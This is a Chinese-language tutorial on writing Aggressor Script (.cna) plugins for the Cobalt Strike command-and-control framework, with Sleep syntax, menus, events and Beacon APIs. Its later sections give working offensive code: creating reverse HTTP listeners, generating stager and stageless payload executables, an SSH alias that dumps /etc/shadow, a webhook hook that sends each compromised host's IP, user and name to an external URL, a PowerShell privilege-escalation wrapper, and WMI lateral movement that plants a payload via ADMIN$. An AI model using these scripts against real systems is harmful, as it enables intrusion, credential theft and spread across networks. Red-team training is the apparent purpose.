# Aggressor Script 开发指南

Aggressor Script 是 Cobalt Strike 3.0+ 内置的脚本语言，基于 Sleep 脚本引擎解析。用于自定义菜单、自动化任务、事件响应、插件开发。脚本文件后缀为 `.cna`。

---

## 基础环境

### Sleep 语言基础

Aggressor Script 由 Sleep 语言解析，Sleep 是基于 Java 的脚本语言。

```bash
# 独立运行 Sleep 解释器
java -jar sleep.jar

# 加载 CNA 到 CS
Cobalt Strike → Script Manager → Load → 选择 .cna 文件
```

### 无 GUI 客户端

```bash
# 使用 agscript 运行无 GUI 的 CS 客户端
./agscript <host> <port> <user> <password>

# 加载 CNA 脚本
./agscript <host> <port> <user> <password> <script.cna>
# 适合在服务端持续运行 CNA（如上线通知），不依赖本地 GUI 客户端
```

### Aggressor 控制台

```
# 在 CS 中打开
Cobalt Strike → Script Console

# 控制台命令
help        # 帮助信息
?           # 布尔判断，如 ? int(1) == int(2)
e           # 执行代码，如 e println("hello")
x           # 执行计算，如 x 1 + 1（注意空格）
load <path> # 加载 CNA 脚本
reload      # 重新加载 CNA
ls          # 列出已加载的 CNA
proff       # 禁止 Sleep 语法运行
pron        # 允许 Sleep 语法运行
profile     # 统计 CNA 使用的 Sleep 语法
tron        # 开启函数跟踪
troff       # 关闭函数跟踪
```

---

## Sleep 语法快速参考

### 数据类型

```java
# 字符串
$name = "kris";

# 数字
$age = 18;

# 数组 (Arrays) — 可存放混合类型
@user_list = @("kris", 18, "sichuan");
println(@user_list[0]);    # 下标访问

# 哈希 (Hashs)
%dict["name"] = "kris";
%dict["age"] = 18;
println("Dict is " . %dict);

# 字符串拼接使用 . 操作符
println("hello " . $name);
```

**注意：** Sleep 对空格要求严格，运算符两侧必须有空格，如 `($1 + $2)` 而非 `($1+$2)`。

### 遍历

```java
@name_list = @("Alice", "Bob", "Charlie");
foreach $var (@name_list) {
    println($var);
}
```

### 数组操作

```java
# 追加元素
@names = @("Alice", "Bob");
push(@names, "Charlie");
```

### 函数定义

```java
sub add {
    return $1 . "+" . $2 . "=" . ($1 + $2);
}

$sum = add(1, 2);
println($sum);
# 输出：1+2=3
```

### 命令定义

```java
# 在 Aggressor 控制台中注册自定义命令
command hello {
    println("hello " . $1);
}
# 使用：hello world → 输出 hello world
# $1 是第一个参数，$2 是第二个，以此类推
```

### 彩色输出

```java
println("\c4This is colored text");
# \c0 到 \cF 对应不同颜色
```

---

## 界面自定义

### 键盘快捷键

```java
bind Ctrl+H {
    show_message("快捷键触发！");
    elog("使用了快捷键");  # 在 Event Log 显示
}
# 支持 Ctrl、Shift、Alt 等修饰符组合
```

### 自定义菜单（顶部菜单栏）

```java
popup my_menu {
    item("&打开百度", { url_open("http://www.baidu.com"); });
    separator();  # 分隔线
    item("&打开谷歌", { url_open("http://www.google.com"); });
}
menubar("自定义菜单", "my_menu");
```

### 扩展已有菜单

```java
# 在 Help 菜单下添加
popup help {
    item("&关于汉化", { show_message("4.1 汉化 by XXX"); });
    separator();
}
```

### 右键菜单（Beacon 会话）

```java
# beacon_bottom — 添加到右键菜单底部
popup beacon_bottom {
    item("&自定义操作", { show_message("clicked!"); });
}

# beacon_top — 添加到右键菜单顶部
popup beacon_top {
    item("&优先操作", { show_message("top item!"); });
}

# 多级菜单
popup beacon_bottom {
    menu "工具箱" {
        item("&选项 A", { /* code */ });
        item("&选项 B", { /* code */ });
    }
}
```

### SSH 会话右键菜单

```java
popup ssh {
    item "执行命令" {
        prompt_text("输入命令：", "w", lambda({
            binput(@ids, "shell $1");
            bshell(@ids, $1);
        }, @ids => $1));
    }
}
```

### 对话框 (Dialog)

```java
sub on_submit {
    # $1 = dialog 引用, $2 = 按钮名称, $3 = 输入值哈希
    show_message("dialog 引用：" . $1 . "\n按钮：" . $2);
    println("用户名：" . $3["user"] . "\n密码：" . $3["password"]);
}

sub show_dialog {
    $dialog = dialog("登录信息", %(user => "root", password => ""), &on_submit);
    drow_text($dialog, "user", "用户名：");
    drow_text($dialog, "password", "密码：");
    dbutton_action($dialog, "确认");
    dbutton_help($dialog, "http://help.example.com");
    dialog_show($dialog);
}

# 调用示例
popup my_menu {
    item("&输入信息", { show_dialog(); });
}
menubar("工具", "my_menu");
```

**dialog 回调参数：**
- `$1` — dialog 引用
- `$2` — 按钮名称
- `$3` — 用户输入值（哈希表）

---

## 事件处理

### Event Log 状态栏

```java
set EVENT_SBAR_LEFT {
    return "[" . tstamp(ticks()) . "] " . mynick() . " 在线";
}

set EVENT_SBAR_RIGHT {
    return "[lag: $1 $+ ]";
}
```

### 用户加入事件

```java
on event_join {
    # $1 = 加入的用户名, $2 = 时间
    show_message($1 . " 加入了服务器！");
    elog(mynick() . " 来了！");
}
```

### Beacon 上线事件

```java
on beacon_initial {
    # $1 = 新上线的会话 ID
    show_message("新主机上线！\n" .
        "会话ID：" . $1 . "\n" .
        "OS：" . beacon_info($1, "os") . "\n" .
        "内网IP：" . beacon_info($1, "internal"));
}
```

### DNS Beacon 上线事件

```java
# DNS Beacon 上线时不会触发 beacon_initial
# 需要使用 beacon_initial_empty 并手动切换通信模式
on beacon_initial_empty {
    bmode($1, "dns-txt");    # 切换数据传输方式
    bcheckin($1);            # 强制回连
}

on beacon_initial {
    show_message("主机上线：" . beacon_info($1, "internal"));
}
```

### SSH 会话上线事件

```java
on ssh_initial {
    show_message("Linux 主机上线\n" .
        "IP：" . beacon_info($1, "internal") . "\n" .
        "主机名：" . beacon_info($1, "computer"));
}
```

官方事件列表：https://www.cobaltstrike.com/aggressor-script/events.html

---

## 数据模型 (Data Model)

### 数据查询接口

| 模型 | 说明 |
|------|------|
| `targets()` | 上线过的目标主机信息 |
| `beacons()` | 所有 Beacon 会话（含离线） |
| `credentials()` | 获取的凭据和票据 |
| `downloads()` | 下载记录 |
| `keystrokes()` | 键盘记录 |
| `screenshots()` | 截图数据（二进制流） |
| `sites()` | 托管资源和监听端口 |
| `archives()` | 最近的输出信息 |

```java
# 控制台查询示例
x targets()
x beacons()
x targets()[0]["address"]    # 下标 + 字典操作

# CNA 脚本获取主机信息
command info {
    println("IP：" . targets()[$1]["address"] .
            "\nOS：" . targets()[$1]["os"] .
            "\n名称：" . targets()[$1]["name"]);
}
```

### Beacon 元数据

```java
# 获取所有会话 ID
x beacon_ids()

# 获取会话详细信息
x beacon_info(beacon_ids()[0])
x beacon_info(beacon_ids()[0])["os"]

# 遍历所有会话
command show_all {
    foreach $entry (beacons()) {
        println("== 会话ID [" . $entry['id'] . "] ==");
        foreach $key => $value ($entry) {
            println("$[15]key : $value");
        }
        println();
    }
}
```

### 会话类型判断

```java
# 判断是否为 SSH（Linux）会话
command check_type {
    foreach @id (beacon_ids()) {
        if (-isssh @id) {
            println(@id . " 是 Linux 主机 " .
                    beacon_info(@id, "computer"));
        } else {
            println(@id . " 是 Windows 主机 " .
                    beacon_info(@id, "computer"));
        }
    }
}
```

---

## Listener 操作

### 查询监听器

```java
# 列出所有监听器
x listeners()

# 本地监听器（如 SMB）
x listeners_local()

# 监听器详细信息
x listener_info("监听器名称")

# 遍历所有监听器信息
command show_listeners {
    foreach $name (listeners()) {
        println("\n== " . $name . " ==");
        foreach $key => $value (listener_info($name)) {
            println("$[10]key : $value");
        }
    }
}
```

### 创建监听器

```java
# listener_create_ext(名称, payload, 配置哈希)
listener_create_ext("my_http",
    "windows/beacon_http/reverse_http",
    %(host => "192.168.1.100",
      port => 8080,
      beacons => "192.168.1.100"));
```

**Payload 类型：**

| Payload | 类型 |
|---------|------|
| `windows/beacon_dns/reverse_dns_txt` | Beacon DNS |
| `windows/beacon_http/reverse_http` | Beacon HTTP |
| `windows/beacon_https/reverse_https` | Beacon HTTPS |
| `windows/beacon_bind_pipe` | Beacon SMB |
| `windows/beacon_bind_tcp` | Beacon TCP |
| `windows/beacon_extc2` | External C2 |
| `windows/foreign/reverse_http` | Foreign HTTP |
| `windows/foreign/reverse_https` | Foreign HTTPS |

**配置参数：**

| 参数 | DNS | HTTP/S | SMB | TCP |
|------|-----|--------|-----|-----|
| althost | - | HTTP Host Header | - | - |
| bindto | bind port | bind port | - | - |
| beacons | C2 Hosts | C2 Hosts | - | - |
| host | staging Host | staging Host | - | - |
| port | C2 port | C2 port | pipe name | port |
| profile | - | profile variant | - | - |
| proxy | - | proxy config | - | - |

---

## Payload 与 Stager 生成

### Stager 数据

```java
# 获取 Stager 数据
$data = stager("listener_name", "x64");

# 生成可执行文件
$data = artifact_stager("listener_name", "exe", "x64");

$handle = openf(">output.exe");
writeb($handle, $data);
closef($handle);
```

**artifact_stager 支持的文件类型：**

| 类型 | 说明 |
|------|------|
| dll | DLL 文件 |
| exe | EXE 可执行文件 |
| powershell | PowerShell 脚本 |
| python | Python 脚本 |
| raw | 原始 shellcode |
| svcexe | Windows Service EXE |
| vbscript | VBS 脚本 |

### Stageless Payload

```java
# 导出无阶段 Payload（完整 shellcode）
$data = payload("listener_name", "x64");

$handle = openf(">payload.bin");
writeb($handle, $data);
closef($handle);
```

### 本地 Stager

```java
# TCP Bind Stager
$tcp = stager_bind_tcp("tcp_listener", "x64", "4444");

# SMB Pipe Stager
$smb = stager("smb_listener");
```

---

## Beacon 操作 API

### 会话传递

```java
# 打开 Listener 选择框并传递会话
popup beacon_bottom {
    item("&会话传递", {
        openPayloadHelper(lambda({
            bspawn($bid, $1);
        }, $bid => $1));
    });
}
```

### 别名 (Alias)

```java
# 为 Beacon 控制台添加自定义命令
alias info {
    # $1 = 会话 ID, $2+ = 用户参数
    blog($1, "名字：$2，年龄：$3");
}
# Beacon 中使用：info Alice 25
```

### SSH 别名

```java
ssh_alias hashdump {
    if (-isadmin $1) {
        binput($1, "导出 /etc/shadow");
        bshell($1, "cat /etc/shadow");
    } else {
        berror($1, "需要管理员权限！");
    }
}
```

### 注册命令帮助

```java
# 让自定义命令出现在 help 列表中
ssh_command_register(
    "hashdump",
    "导出 Linux 密码哈希",
    "使用方式：hashdump"
);
```

### 日志记录

```java
# 在 Beacon 控制台显示信息
binput($bid, "执行了自定义操作");

# 执行命令并显示
binput($bid, bshell($bid, "whoami"));
```

### 常用 Beacon API

```java
# 执行系统命令
bshell($bid, "whoami");

# 切换 DNS 通信模式
bmode($bid, "dns-txt");

# 强制回连
bcheckin($bid);

# 在 Beacon 输出信息
blog($bid, "这是输出信息");

# 显示错误信息
berror($bid, "操作失败！");

# 任务标记（用于日志和 ATT&CK 映射）
btask($bid, "描述信息", "T1059");

# 执行 Job
beacon_execute_job($bid, "program", "args", 1);
```

---

## 实战脚本示例

### 上线通知（Server 酱 / Webhook）

```java
on beacon_initial {
    sub http_get {
        local('$output');
        $url = [new java.net.URL: $1];
        $stream = [$url openStream];
        $handle = [SleepUtils getIOHandle: $stream, $null];
        @content = readAll($handle);
        foreach $line (@content) {
            $output .= $line . "\r\n";
        }
        println($output);
    }

    $externalIP = replace(beacon_info($1, "external"), " ", "_");
    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
    $userName = replace(beacon_info($1, "user"), " ", "_");
    $computerName = replace(beacon_info($1, "computer"), " ", "_");

    # 替换为实际的 Webhook URL
    $url = "https://webhook.example.com/notify?" .
           "ip=" . $externalIP .
           "&internal=" . $internalIP .
           "&user=" . $userName .
           "&host=" . $computerName;

    http_get($url);
}
```

### 权限提升注册

```java
# 注册自定义提权 exploit
# beacon_exploit_register(名称, 描述, 函数引用)
sub my_exploit {
    local('$handle $script $oneliner');
    btask($1, "执行自定义提权 via $2", "T1068");

    $handle = openf(getFileProper(script_resource("modules"), "exploit.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    $oneliner = beacon_host_script($1, $script);
    bpowerpick!($1, "Invoke-Exploit -Command \"$2\"", $oneliner);
}

beacon_exploit_register("my-exploit", "自定义提权描述", &my_exploit);
```

### 横向移动注册

```java
# 注册自定义横向移动方式
# beacon_remote_exploit_register(名称, 架构, 描述, 函数)
sub wmi_spawn {
    local('$name $exedata');
    btask($1, "通过 WMI 横向到 $2", "T1047");

    $name = "svc" . rand(9999) . ".exe";
    $exedata = artifact_payload($3, "exe", $arch);

    bupload_raw!($1, "\\\\" . $2 . "\\ADMIN\$\\" . $name, $exedata);
    brun!($1, "wmic /node:\"" . $2 . "\" process call create \"\\\\" .
          $2 . "\\ADMIN\$\\" . $name . "\"");

    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("wmi", "x86", "WMI 横向移动",
    lambda(&wmi_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "WMI 横向移动 (x64)",
    lambda(&wmi_spawn, $arch => "x64"));
```

### 自动初始化脚本

```java
on ready {
    println("团队服务器已就绪！");
}
```

---

## 参考资源

- CS 插件编写官方文档：https://www.cobaltstrike.com/help-scripting
- Aggressor Script 官方事件列表：https://www.cobaltstrike.com/aggressor-script/events.html
- Sleep 语法文档：http://sleep.dashnine.org/manual/index.html
